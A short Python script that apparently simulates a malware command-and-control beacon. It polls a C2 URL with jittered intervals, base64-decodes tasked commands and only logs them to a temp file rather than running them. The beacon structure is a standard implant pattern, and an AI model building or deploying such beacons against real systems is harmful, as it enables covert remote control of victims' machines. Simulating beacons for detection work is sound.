import time, requests, base64, random
C2 = 'http://c2-server:8080/beacon'
AGENT_ID = 'agent-1'
def fake_system_log(msg):
    with open('/tmp/agent_sys.log','a') as f:
        f.write(msg + "\\n")
while True:
    jitter = random.uniform(-5,5)
    interval = max(10, 60 + jitter)
    try:
        resp = requests.post(C2, json={'agent_id': AGENT_ID})
        data = resp.json()
        cmd_b64 = data.get('commands','')
        if cmd_b64:
            cmd = base64.b64decode(cmd_b64).decode()
            fake_system_log(f"EXEC_CMD:{cmd}")
        else:
            fake_system_log('NO_CMD')
    except Exception as e:
        fake_system_log(f'ERR:{e}')
    time.sleep(interval)
